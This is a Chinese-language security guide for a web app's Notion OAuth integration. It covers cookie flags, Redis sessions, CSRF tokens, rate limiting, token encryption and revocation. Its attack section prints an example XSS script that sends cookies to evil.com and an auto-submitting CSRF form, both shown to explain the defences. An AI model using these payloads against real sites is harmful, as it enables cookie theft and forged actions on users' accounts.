# Notion 整合安全性說明

## 🔒 當前安全措施

### 1. httpOnly Cookie

**實作位置**: `routes/notionRoutes.js:80-85`

```javascript
res.cookie('notion_token', data.access_token, {
  httpOnly: true,      // 防止 JavaScript 存取
  secure: true,        // 僅 HTTPS 傳輸（生產環境）
  sameSite: 'lax',     // 防止 CSRF 攻擊
  maxAge: 90 * 24 * 60 * 60 * 1000  // 90 天
});
```

**安全優勢**:
- ✅ 防止 XSS (Cross-Site Scripting) 攻擊
- ✅ JavaScript 無法讀取或修改 token
- ✅ 前端即使被注入惡意腳本也無法竊取 token

**驗證方法**:
```javascript
// 在瀏覽器 Console 執行（應該無法存取）
document.cookie  // 不會顯示 notion_token
```

### 2. Secure Flag (HTTPS Only)

**作用**:
- 僅在 HTTPS 連線中傳輸 cookie
- 防止中間人攻擊 (MITM)
- 開發環境自動關閉（使用 HTTP）

**環境判斷**:
```javascript
secure: process.env.NODE_ENV === 'production'
```

### 3. SameSite Protection

**設定**: `sameSite: 'lax'`

**防護內容**:
- 防止 CSRF (Cross-Site Request Forgery) 攻擊
- Cookie 不會在跨站 POST 請求中自動傳送
- 允許從外部網站導向（OAuth 回調需要）

**SameSite 選項比較**:

| 設定 | 跨站導向 | 跨站請求 | OAuth 回調 | 安全性 |
|------|----------|----------|-----------|--------|
| `strict` | ❌ 不傳送 | ❌ 不傳送 | ❌ 不支援 | 最高 |
| `lax` | ✅ 傳送 | ❌ 不傳送 | ✅ 支援 | 中等（我們的選擇） |
| `none` | ✅ 傳送 | ✅ 傳送 | ✅ 支援 | 最低 |

**為什麼選擇 `lax`？**
- Notion OAuth 回調需要從 `notion.so` 導向回我們的應用
- `strict` 會導致回調時 cookie 丟失
- `lax` 在 GET 請求導向時傳送 cookie，但防止跨站 POST

## ⚠️ 當前架構的限制

### 1. Cookie 儲存不適合多用戶生產環境

**問題**:
```javascript
// routes/notionRoutes.js:76-77
// TODO: 在實際應用中，應該將 token 儲存到資料庫
// 並與當前登入的 YouTube 用戶關聯
```

**限制**:
1. **無法多設備同步**: Cookie 只在單一瀏覽器有效
2. **無法集中管理**: 無法統一查看或撤銷所有使用者的 token
3. **水平擴展問題**: 多台伺服器時 cookie 無法共享
4. **用戶關聯困難**: 無法將 Notion token 與 YouTube 用戶綁定

### 2. Token 有效期管理

**當前實作**:
```javascript
maxAge: 90 * 24 * 60 * 60 * 1000  // 固定 90 天
```

**問題**:
- Notion access token 永久有效（直到用戶撤銷）
- Cookie 90 天後過期，但 token 仍有效
- 無法自動刷新或延長 session

## 🚀 生產環境建議方案

### 方案 1：Session + Database（推薦）

**架構**:
```
使用者
  ↓
httpOnly Cookie (session_id)
  ↓
Redis / Database
  ↓
{
  session_id: "abc123",
  youtube_user_id: "user@example.com",
  notion_access_token: "secret_xyz...",
  created_at: "2025-01-01",
  expires_at: "2025-04-01"
}
```

**實作步驟**:

1. **安裝依賴**:
```bash
npm install express-session connect-redis redis
```

2. **設定 Session**:
```javascript
import session from 'express-session';
import RedisStore from 'connect-redis';
import { createClient } from 'redis';

// Redis client
const redisClient = createClient({
  url: process.env.REDIS_URL || 'redis://localhost:6379'
});
redisClient.connect();

// Session middleware
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 30 * 24 * 60 * 60 * 1000  // 30 天
  }
}));
```

3. **儲存 Token**:
```javascript
// routes/notionRoutes.js - OAuth 回調
if (data.access_token) {
  req.session.notion = {
    access_token: data.access_token,
    workspace_id: data.workspace_id,
    workspace_name: data.workspace_name,
    bot_id: data.bot_id,
    connected_at: new Date()
  };

  await req.session.save();
  res.redirect('/?notion_connected=true');
}
```

4. **檢查連接狀態**:
```javascript
router.get('/status', (req, res) => {
  if (req.session.notion?.access_token) {
    return res.json({
      connected: true,
      workspace: req.session.notion.workspace_name
    });
  }
  res.json({ connected: false });
});
```

**優勢**:
- ✅ 集中式 token 管理
- ✅ 支援多設備登入
- ✅ 可撤銷所有 session
- ✅ 水平擴展友善
- ✅ 與 YouTube 用戶綁定

### 方案 2：JWT (不推薦用於儲存 sensitive token)

**為什麼不推薦？**
- JWT 無法撤銷（除非維護黑名單）
- Token 洩漏無法立即失效
- 增加攻擊面

## 🛡️ 額外安全建議

### 1. 實作 CSRF Token

即使有 `sameSite: 'lax'`，仍建議添加 CSRF protection：

```bash
npm install csurf
```

```javascript
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });

// 需要 CSRF 保護的路由
router.post('/save-article', csrfProtection, async (req, res) => {
  // ...
});
```

### 2. Rate Limiting

防止暴力破解和 DDoS：

```bash
npm install express-rate-limit
```

```javascript
import rateLimit from 'express-rate-limit';

const notionLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 分鐘
  max: 100,  // 最多 100 次請求
  message: '請求過於頻繁，請稍後再試'
});

app.use('/api/notion', notionLimiter, notionRoutes);
```

### 3. 加密敏感資料

如果儲存到資料庫，加密 access token：

```javascript
import crypto from 'crypto';

const algorithm = 'aes-256-gcm';
const key = crypto.scryptSync(process.env.ENCRYPTION_KEY, 'salt', 32);

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag();

  return {
    encrypted,
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex')
  };
}

function decrypt(encrypted, iv, authTag) {
  const decipher = crypto.createDecipheriv(
    algorithm,
    key,
    Buffer.from(iv, 'hex')
  );
  decipher.setAuthTag(Buffer.from(authTag, 'hex'));

  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}
```

### 4. 環境變數安全

**.env.local 檢查清單**:
- [ ] 不提交到版本控制（已加入 `.gitignore`）
- [ ] 使用強密碼作為 session secret
- [ ] 定期輪換 API keys
- [ ] 生產環境使用環境變數而非 `.env` 檔案

**生產環境設定**:
```bash
# 使用系統環境變數
export SESSION_SECRET=$(openssl rand -base64 32)
export ENCRYPTION_KEY=$(openssl rand -base64 32)
```

### 5. Token 撤銷機制

**實作 Token 黑名單**:
```javascript
// Redis 儲存已撤銷的 token
async function revokeToken(accessToken) {
  const hash = crypto.createHash('sha256')
    .update(accessToken)
    .digest('hex');

  await redisClient.set(
    `revoked:${hash}`,
    '1',
    { EX: 90 * 24 * 60 * 60 }  // 90 天後自動清除
  );
}

// 檢查 token 是否已撤銷
async function isTokenRevoked(accessToken) {
  const hash = crypto.createHash('sha256')
    .update(accessToken)
    .digest('hex');

  const revoked = await redisClient.get(`revoked:${hash}`);
  return revoked === '1';
}

// Middleware
async function checkTokenRevoked(req, res, next) {
  const token = req.cookies.notion_token || req.session.notion?.access_token;

  if (token && await isTokenRevoked(token)) {
    return res.status(401).json({
      error: 'Token has been revoked',
      needsReauth: true
    });
  }

  next();
}
```

### 6. 審計日誌

記錄所有 Notion 操作：

```javascript
async function logNotionActivity(userId, action, details) {
  await db.notionLogs.create({
    user_id: userId,
    action: action,  // 'connect', 'disconnect', 'save_article'
    details: details,
    ip_address: req.ip,
    user_agent: req.headers['user-agent'],
    timestamp: new Date()
  });
}

// 使用範例
router.post('/save-article', async (req, res) => {
  // ... 儲存文章 ...

  await logNotionActivity(
    req.session.youtube_user_id,
    'save_article',
    { database_id: databaseId, article_title: articleData.selectedTitle }
  );
});
```

## 📊 安全檢查清單

### 開發環境
- [x] httpOnly cookies
- [x] SameSite protection
- [ ] CSRF tokens (建議添加)
- [ ] Rate limiting (建議添加)
- [x] 環境變數隔離

### 生產環境（必須）
- [ ] 強制 HTTPS (`secure: true`)
- [ ] Session storage (Redis/Database)
- [ ] Token 加密儲存
- [ ] CSRF protection
- [ ] Rate limiting
- [ ] 審計日誌
- [ ] Token 撤銷機制
- [ ] 定期安全審計

## 🚨 常見攻擊和防護

### 1. XSS (Cross-Site Scripting)

**攻擊方式**:
```javascript
// 攻擊者注入惡意腳本
<script>
  fetch('https://evil.com?token=' + document.cookie)
</script>
```

**我們的防護**:
- ✅ `httpOnly: true` - JavaScript 無法讀取 cookie
- ✅ React 自動轉義輸出
- ✅ 不使用 `dangerouslySetInnerHTML`

### 2. CSRF (Cross-Site Request Forgery)

**攻擊方式**:
```html
<!-- 攻擊者網站 -->
<form action="https://yourapp.com/api/notion/save-article" method="POST">
  <input name="databaseId" value="malicious_db">
</form>
<script>document.forms[0].submit()</script>
```

**我們的防護**:
- ✅ `sameSite: 'lax'` - 防止跨站 POST 請求
- ⚠️ 建議添加 CSRF token

### 3. Session Hijacking

**攻擊方式**:
- 竊取 cookie 後冒充使用者

**我們的防護**:
- ✅ `httpOnly: true` - 防止 JavaScript 竊取
- ✅ `secure: true` - 防止中間人攻擊
- ⚠️ 建議添加 IP 檢查和 User-Agent 驗證

### 4. Cookie Injection

**攻擊方式**:
- 注入惡意 cookie 值

**防護**:
```javascript
// 驗證 cookie 值格式
function validateToken(token) {
  if (!token || typeof token !== 'string') {
    return false;
  }

  // Notion token 格式驗證
  if (!token.startsWith('secret_') || token.length < 50) {
    return false;
  }

  return true;
}

router.get('/status', (req, res) => {
  const token = req.cookies.notion_token;

  if (!validateToken(token)) {
    res.clearCookie('notion_token');
    return res.json({ connected: false });
  }

  // 繼續處理...
});
```

## 🔍 安全審計指令

### 檢查依賴漏洞
```bash
npm audit
npm audit fix
```

### 檢查 Cookie 設定
```bash
# 在瀏覽器 DevTools > Application > Cookies
# 確認:
# - HttpOnly: ✓
# - Secure: ✓ (生產環境)
# - SameSite: Lax
```

### 測試 HTTPS
```bash
# 使用 ngrok 測試 HTTPS
ngrok http 3001

# 確認 secure cookie 正常運作
```

## 📚 延伸閱讀

- [OWASP Cookie Security](https://owasp.org/www-community/controls/SecureCookieAttribute)
- [MDN: Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [SameSite Cookies Explained](https://web.dev/samesite-cookies-explained/)
- [Express Session Security](https://expressjs.com/en/advanced/best-practice-security.html)

## 📝 總結

**當前實作（適合開發/小型專案）**:
- ✅ httpOnly cookies
- ✅ Secure flag (生產環境)
- ✅ SameSite protection
- ⚠️ 不適合多用戶生產環境

**生產環境升級建議**:
1. 使用 Session + Redis/Database
2. 添加 CSRF protection
3. 實作 Rate limiting
4. 加密敏感資料
5. 添加審計日誌
6. 定期安全審計

**風險評估**:
- 🟢 低風險：開發環境、個人使用
- 🟡 中風險：小型團隊內部工具
- 🔴 高風險：公開服務、多用戶環境（需升級架構）
